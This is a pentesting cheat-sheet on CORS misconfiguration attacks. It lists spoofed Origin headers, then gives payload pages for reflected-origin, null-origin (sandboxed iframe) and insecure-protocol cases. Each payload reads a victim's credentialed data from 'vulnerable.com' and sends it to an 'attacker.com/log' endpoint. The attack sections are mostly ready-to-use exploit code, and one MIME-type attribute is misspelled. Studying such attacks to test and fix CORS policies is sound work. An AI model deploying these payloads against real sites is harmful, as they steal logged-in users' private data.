title: CORS (Cross-Origin Resource Sharing) Attack
description: CORS is a mechanism that allows restricted resources on a web page to be requested from another domain outside the domain from which the first resource was served. The CORS Attack is the attacking methodology that abuses this mechanism.

## Bypass Restriction

Assume that `https://example.com` restricts the access by CORS. We try to set domains that are allowed to `Origin` header.

```bash
Origin: https://example.com
Origin: http://localhost
Origin: https://api.example.com
```

<br />

## Origin Reflection

### 1. Change Origin Value of Request Header

```sh
Origin: https://attacker.com
```

```sh
Origin: https://vulnerable.com.attacker.com
```

### 2. Check if the Response Allowing Cross-Origin

It's reflected the previous reqeust in the response header, you can exploit it.

```sh
Access-Control-Allow-Origin: https://attacker.com
```

```sh
Access-Control-Allow-Origin: https://vulnerable.com.attacker.com
Access-Control-Allow-Credentials: true
```

### 3. Exploit with Your Malicious Web Page

For example, it's hosted as "https://attacker.com/exploit" or "https://vulnerable.com.attacker.com/exploit".  
Add the JavaScript code in the web page.  

It shows the users' sensitive information of the target website in your server's log.

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET', 'https://vulnerable.com/details', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '/log?key=' + this.responseText;
    }
</script>
```

<br />

## Null origin

### 1. Send Request with Origin: null

```sh
Origin: null
```

### 2. Check if the Response Allowing Cross-Origin

```sh
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### 3. Add the iframe to Your Malicious Web Page

For example, it's hosted as "https://attacker.com/exploit".

```html
<iframe
    sandbox="allow-scripts allow-top-navigation allow-forms"
    srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://vulnerable.com/details', true);
        req.withCredentials = true;
        req.send();
        
        function reqListener() {
            location = 'https://attacker.com/log?key=' + encodeURIComponent(this.responseText);
        }
        </script>"
></iframe>
```

<br />

## Insecure Protocol

### 1. Send Request with Abbused Origin

```sh
Origin: http://subdomain.vulnerable.com
```

### 2. Check if the Response Allowing Cross-Origin

```sh
Access-Control-Allow-Origin: http://subdomain.vulnerable.com
Access-Control-Allow-Credentials: true
```

### 3. Add the JavaScript Code to Your Malicious Web Page

It's hosted as "https://attacker.com/exploit"

```html
<script>
    document.location="http://subdomain.vulnerable.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable.com/details',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

<br />

## JSONP (Json with Padding)

```html
<script>
	var userinfo = function (data) {
		alert(JSON.stringify(data));
	}
</script>
<script src="https://vulnerable.com/example.php?value=userinfo" type="text/javascriipt"></script>
```
